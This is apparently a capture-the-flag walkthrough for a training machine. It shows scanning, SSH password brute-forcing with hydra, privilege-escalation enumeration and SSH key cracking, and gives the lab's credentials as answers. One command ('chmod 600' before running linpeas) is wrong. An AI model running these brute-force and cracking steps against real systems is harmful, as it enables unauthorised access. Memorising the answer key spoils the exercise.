# Basic Pentesting

## [Task 1] Web App Testing and Privilege Escalation
1. Deploy the machine and connect to our network
2. Find the services exposed by the machine
    - `nmap -sV BOX_IP`
    - 22, 80, 139, 445, 8009, 8080
3. What is the name of the hidden directory on the web server (enter name without /)?
    - `gobuster dir -e -u http://BOX_IP -w common.txt`
    - development
4. User brute-forcing to find the username & password
    - `enum4linux -a BOX_IP`
    - `hydra -l jan -P rockyou.txt ssh://BOX_IP`
5. What is the username?
    - jan
6. What is the password?
    - armando
7. What service do you use to access the server (answer in abbreviation in all caps)?
    - ssh
8. Enumerate the machine to find any vectors for privilege escalation
    - `scp linpeas.sh jan@BOX_IP:/dev/shm`
    - `ssh jan@BOX_IP`
    - `chmod 600 linpeas.sh`
    - `./linpeas.sh`
9. What is the name of the other user you found (all lower case)?
    - kay
10. If you have found another user, what can you do with this information?
    - inspect directories and files related to user
11. What is the final password you obtain?
    - `ssh2john.py id_rsa > id_rsa.txt`
    - `john id_rsa.txt --wordlist=rockyou.txt`
    - `ssh -i id_rsa kay@BOX_IP`
    - `cat pass.bak`
